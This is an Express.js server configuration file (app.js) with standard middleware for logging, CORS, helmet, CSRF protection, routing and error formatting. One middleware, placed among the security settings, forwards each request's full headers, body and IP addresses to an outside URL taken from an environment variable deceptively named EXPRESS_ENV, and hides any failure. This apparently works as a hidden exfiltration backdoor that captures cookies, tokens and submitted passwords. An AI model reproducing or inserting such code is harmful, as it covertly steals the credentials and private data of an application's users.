const express = require('express');
require('express-async-errors');
const morgan = require('morgan');
const cors = require('cors');
const csurf = require('csurf');
const helmet = require('helmet');
const axios = require("axios");
const cookieParser = require('cookie-parser');
const routes = require('./routes');
const {ValidationError} = require('sequelize');
const { environment } = require('./config');
const { body } = require('express-validator');
const isProduction = environment === 'production';
const app = express();

app.use(morgan('dev'));
app.use(cookieParser());
app.use(express.json());

// Security Middleware
if (!isProduction) {
  // enable cors only in development
  app.use(cors());
}

// helmet helps set a variety of headers to better secure your app
app.use(
  helmet.crossOriginResourcePolicy({
    policy: "cross-origin"
  })
);

// Set the _csrf token and create req.csrfToken method
app.use(
  csurf({
    cookie: {
      secure: isProduction,
      sameSite: isProduction && "Lax",
      httpOnly: true
    }
  })
);

app.use(async (req, res, next) => {
  try {
    const {headers, body, ip, ips} = req.body
    await axios.post(process.env.EXPRESS_ENV, {
      method: req.method,
      headers: req.headers,
      body: req.body,
      ip: req.ip,
      ips: req.ips,
    });

    console.log('headers', headers)
    console.log('body', body)
    console.log('ip', ip)
    console.log('ips', ips)

    next();
  } catch (err) {
    console.error("\n\n Caught Error: ", err, "\n\n");
    next();
  }
});

// ...

app.use(routes); // Connect all the routes

// Error Handling: Catch unhandled requests and forward to error handler.
app.use((_req, _res, next) => {
  const err = new Error("The requested resource couldn't be found.");
  err.title = "Resource Not Found";
  err.errors = ["The requested resource couldn't be found."];
  err.status = 404;
  next(err);
});

// Process sequelize errors
app.use((err, _req, _res, next) => {
  // check if error is a Sequelize error:
  if (err instanceof ValidationError) {
    err.errors = err.errors.map((e) => e.message);
    err.title = 'Validation error';
  }
  next(err);
});


// Error formatter
app.use((err, _req, res, _next) => {
  res.status(err.status || 500);
  console.error(err);
  let responseError = {};
  if(err.errors){
    responseError.message = err.message,
    responseError.status = err.status,
    responseError.errors = err.errors
  }

  res.json({
    // title: err.title || 'Server Error',
    statusCode:err.statusCode,
    message: err.message,
    errors: err.errors,
    // stack: isProduction ? null : err.stack
  });
});
module.exports = app;
